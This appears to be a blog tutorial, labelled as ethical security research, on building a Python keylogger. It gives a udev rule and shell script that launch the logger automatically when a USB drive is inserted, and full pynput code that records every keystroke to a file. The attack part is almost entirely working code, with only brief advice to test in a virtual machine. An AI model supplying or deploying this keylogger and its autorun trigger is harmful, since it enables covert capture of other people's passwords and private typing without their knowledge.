---
title: >-
  Building a Python Keylogger: A Security Researcher’s development to
  Understanding Keystroke Logging
date: '2024-09-24'
author: Bhaskar
categories:
  - cybersecurity
  - ethical hacking
  - python programming
  - keylogging
  - security research
tags:
  - Keylogging
  - Python Programming
  - Cybersecurity
  - Security Research
  - Ethical Hacking
  - Python Scripts
  - Keystroke Logging
  - Security Tools
  - Penetration Testing
  - Educational Purposes
description: >-
  A step-by-step writeup to building a Python-based keylogger, designed for
  ethical security researchers to understand how keystroke logging works, and
  best practices for staying within legal boundaries.
images:
  - 'https://i.ibb.co/8cQfMsT/Whats-App-Image-2024-09-25-at-19-00-45.jpg'
featured: true
---

### Setting up USB Autorun (for testing):
1. **Windows**: You would need an `autorun.inf` file on the USB, but keep in mind this is typically disabled by default for security.
   
2. **Linux/macOS**: You can set up a udev rule on Linux that triggers a script when a USB drive is inserted.

Here’s an example of how you might trigger your Python script on Linux when a USB drive is inserted using **udev rules**.

### Steps for Linux Setup:

1. **Create udev rule**:
   First, create a udev rule to detect the USB drive and execute the Python script.

   Create the file `/etc/udev/rules.d/99-usb-keylogger.rules`:

   ```bash
   sudo nano /etc/udev/rules.d/99-usb-keylogger.rules
   ```

   Add the following content:

   ```bash
   ACTION=="add", ATTRS{idVendor}=="XXXX", ATTRS{idProduct}=="YYYY", RUN+="/path/to/keylogger.sh"
   ```

   Replace `XXXX` and `YYYY` with the actual vendor ID and product ID of your USB. You can find them by running `lsusb` after inserting the USB.

2. **Create a shell script** to run the Python keylogger:

   Save this file as `keylogger.sh` in `/path/to/keylogger.sh` (make sure the path matches the udev rule):

   ```bash
   #!/bin/bash
   python3 /path/to/keylogger.py &
   ```

   Make the script executable:

   ```bash
   chmod +x /path/to/keylogger.sh
   ```

3. **Test**: When you plug in the USB drive, the `keylogger.sh` script should be triggered, which in turn starts the Python keylogger.

### Python Keylogger (Same as Above):

```python
from pynput.keyboard import Key, Listener

log_file = "/path/to/keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

<a href="https://ibb.co/56C0651"><img src="https://i.ibb.co/80GC0jm/Whats-App-Image-2024-09-25-at-19-00-23.jpg" alt="Whats-App-Image-2024-09-25-at-19-00-23" border="0"></a>

### Testing Environment
To safely test these kinds of setups:
- **Use a virtual machine**: This ensures that any experiments are isolated and won’t affect your main system.
- **Have clear logs**: Log all activity to better understand the behavior and outcomes.
